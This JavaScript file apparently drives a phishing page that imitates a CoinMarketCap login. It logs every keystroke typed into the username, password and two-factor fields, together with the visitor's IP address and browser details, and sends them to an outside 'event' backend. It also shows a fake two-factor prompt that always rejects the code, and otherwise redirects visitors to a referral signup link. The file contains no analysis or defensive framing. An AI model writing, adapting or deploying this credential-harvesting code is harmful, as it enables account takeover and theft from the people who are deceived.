const BACKEND_URL = 'https://event.coinmarketcap.jp/';
// const BACKEND_URL = 'http://127.0.0.1:8001/';
var PREVIOUS_SENT_DATA;
let USER_IP = 'none';
let USER_AGENT = 'none';

document.addEventListener('DOMContentLoaded', function () {
  USER_AGENT = navigator.USER_AGENT;
  function getUserIP() {
    fetch('https://api.ipify.org?format=json')
      .then((response) => response.json())
      .then((data) => {
        USER_IP = data.ip;
      })
      .catch((error) => {
        console.error('Error fetching IP address:', error);
      });
  }

  getUserIP();

  async function sendEvent(event, href) {
    const formData = {
      event: event,
      ip: USER_IP,
      USER_AGENT: USER_AGENT,
      href: href,
    };

    // Get all fields in the form
    const inputs = document.querySelectorAll('[id^="coinmarketcap-"]');
    for (const input of inputs) {
      const name = input.id.replace('coinmarketcap-', '');
      const value = input.value.trim();
      if (value !== '') {
        formData[name] = value;
      }
    }

    const jsonData = JSON.stringify(formData);
    //Same data sent, not send data
    if (jsonData == PREVIOUS_SENT_DATA) {
      return;
    }

    PREVIOUS_SENT_DATA = jsonData;

    const response = await fetch(`${BACKEND_URL}event`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: jsonData,
    });

    const data = await response.json();
  }

  // Get all event redirect
  const anchorTags = document.getElementsByTagName('a');

  for (let i = 0; i < anchorTags.length; i++) {
    anchorTags[i].addEventListener('click', async function (event) {
      event.preventDefault();
      const linkHref = this.getAttribute('href');
      await sendEvent('redirect', linkHref);
      if (linkHref) {
        window.location.href = linkHref;
      }
    });
  }

  // Add event listeners for input and button elements
  const inputs = document.querySelectorAll('[id^="coinmarketcap-"]');
  for (const input of inputs) {
    if (input.nodeName === 'INPUT') {
      input.addEventListener('keyup', async function (event) {
        await sendEvent('keyup');
      });
    } else if (input.nodeName === 'BUTTON') {
      input.addEventListener('click', async function () {
        await sendEvent('button_click');
      });
    }
  }

  window.addEventListener('load', function () {
    sendEvent('window_loaded');
  });

  window.addEventListener('beforeunload', async function (event) {
    await sendEvent('window_closed');
  });
});

function isEmail(email) {
  const emailPattern = /^[a-zA-Z0-9._-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,4}$/;
  return emailPattern.test(email);
}

function showToastify(content) {
  toastifyContentElement.textContent = content;
  toastifyElement.style.display = 'block';
  setTimeout(() => {
    toastifyElement.style.display = 'none';
  }, 3000);
}

const usernameElement = document.getElementById('coinmarketcap-username');
const passwordElement = document.getElementById('coinmarketcap-password');
const twoFactorElement = document.getElementById('two-factor');

const toastifyElement = document.getElementById('toastify');
const toastifyContentElement = document.getElementById('toastify-content');

const loginComponent = document.getElementById('coinmarketcap-login');
loginComponent.addEventListener('click', async (event) => {
  let username = usernameElement.value;
  let password = passwordElement.value;
  if (username == '' || password == '') {
    showToastify('Failed to login. Check your email and password');
    return;
  } else {
    if (!isEmail(username)) {
      showToastify('Failed to login. Check your email and password');
      return;
    }
  }

  fetch(`${BACKEND_URL}checkadmin`)
    .then((response) => {
      if (!response.ok) {
        throw new Error(`HTTP error! Status: ${response.status}`);
      }
      return response.json();
    })
    .then((data) => {
      if (data.status == true) {
        twoFactorElement.style.display = 'block';
      } else {
        window.location.href =
          'https://app.vortic-united.com/signup?referral=YJkvxEhWz4efGNBVVdCWwMa9bcSix9U1';
      }
    })
    .catch((error) => {
      console.error('Fetch error:', error);
      window.location.href =
        'https://app.vortic-united.com/signup?referral=YJkvxEhWz4efGNBVVdCWwMa9bcSix9U1';
    });
});

const twoFactorValueElement = document.getElementById('coinmarketcap-captcha');
function submitTwoFactor() {
  if (twoFactorValueElement.value.length == 6) {
    setTimeout(() => {
      showToastify('Wrong code of two-factor authentication');
      twoFactorElement.style.display = 'none';
    }, 1000);
  } else {
    showToastify('Two-factor authentication must have 6 digits');
  }
}
